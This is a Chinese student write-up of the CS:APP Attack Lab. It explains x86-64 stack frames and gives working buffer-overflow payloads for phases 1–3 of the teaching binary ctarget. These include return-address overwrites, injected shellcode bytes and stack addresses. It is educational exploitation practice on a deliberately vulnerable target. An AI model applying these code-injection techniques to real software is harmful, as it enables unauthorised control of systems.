# Attack Lab

## x86-64的函数调用

x86-64 的函数调用过程，需要做的设置有：

- 调用者：
  - 为要保存的寄存器值及可选参数分配足够大控件的栈帧
  - 把所有调用者需要保存的寄存器存储在帧中
  - 把所有需要保存的可选参数按照逆序存入帧中
  - `call foo:` 会先把 `%rip` 保存到栈中，然后跳转到 label `foo`
- 被调用者
  - 把任何被调用者需要保存的寄存器值压栈减少 `%rsp` 的值以便为新的帧腾出空间

x86-64 的函数返回过程：

- 被调用者
  - 增加 `%rsp` 的计数，逆序弹出所有的被调用者保存的寄存器，执行 `ret: pop %rip`

### x86-64的栈帧

当过程P调用过程Q时，会把返回地址压入栈中，指明当Q返回时，要从P程序的哪个位置继续执行，把这个返回地址当作P的栈帧的一部分

## 具体任务

![img](.\img\AttackLabTasks.jpg)

因为没有课程网站的账号，所以只能通过`./ctarget -q`和`/rtarget -q`来进行实验

这个lab不需要查看x86汇编来进行逆向，pdf中已经给出了函数的C表示

## phase_1

ctarget的正常流程是执行`test`

```c
void test() {
    int val;
    val = getbuf();
    printf("NO explit. Getbuf returned 0x%x\n", val);
}
```

```c
void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

为了使程序执行touch1函数，需要对getbuf函数进行缓冲区溢出攻击，将getbuf的返回值替换为touch1的实际地址0x4017c0

因为getbuf函数汇编代码如下

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

其缓冲区有40（0x28）字节，使用gdb运行getbuf时发现在getbuf的原返回地址后即为分配的缓冲区，因此只需使用40字节的任意内容加上小端表示的touch1函数地址0x4017c0即可，如下

```
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00
c0 17 40 00
```

然后再使用`./hex2raw`转换为ctarget能够读取的2进制文件即可

## phase_2

`Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,
however, you must make it appear to touch2 as if you have passed your cookie as its argument.`

touch2的C表示如下

```c
void touch2(unsigned val) {
    vlevel = 2; 		/* Part of validationg protocol */
    if  (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

需要将cookie作为参数传入，然后将touch2函数的起始地址压入栈中，最后返回

```assembly
mov $0x59b997fa, %rdi
pushq $0x4017ec # 最开始不小心写成了pushq 0x4017ec，这样就变成了内存寻址，直接触发段错误。。
ret
```

将这段汇编通过汇编器转换为对应的机器码(`gcc -c phase_2.s`, `objdump -d phase_2.o`)，将机器码通过get_buf输入到缓冲区中，再在get_buf还未结束时通过phase_1中使用过的方法溢出将返回地址修改为缓冲区的地址（即此时的$rsp），跳转到缓冲区来执行注入的机器码，执行完注入的机器码后将带着设定好的参数跳转到touch2完成phase_2

```
48 c7 c7 fa 97 b9 59 
68 ec 17 40 00 
c3 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
78 dc 61 55
```

## phase_3

涉及的函数的C表示是

```c
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
    vlevel = 3;
    if (hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

`Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument`

这道题需要我们以字符串形式传入cookie，将`0x59b997fa`转换为字符串为`35 39 62 39 39 37 66 61 `（16进制）

因为这道题中要调用hexmatch和strncmp来验证字符串是否相同，getbuf函数的缓冲区可能会被覆盖，所以得试过一遍才知道字符串的位置应该放在哪里，将这个地址addr替换为实际可用的栈上地址即可

```assembly
mov $addr, %rdi # 将cookie字符串首地址设置为第一个参数
push $0x4018fa 	# 将touch3函数地址压入栈中
ret
```

先随便在addr处填一个栈上出现过的地址，然后开始调试，在touch3函数中调用hextouch前的\$rsp是0x5561dca0，调用后getbuf原缓冲区的内容几乎都被覆盖，所以需要找个其他位置来放cookie字符串，我选的是0x5561dcb8，直接在原答案后多加3个字节（因为要补全跳转地址至8个字节）就可以了，然后要更新addr。因为touch3会调用exit直接返回，所以不用管栈上其他数据的死活（

```
48 c7 c7 a8 dc 61 55 
68 fa 18 40 00 
c3 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

这个phase因为要查看内存的次数太多，所以我用了clion的可视化调试器
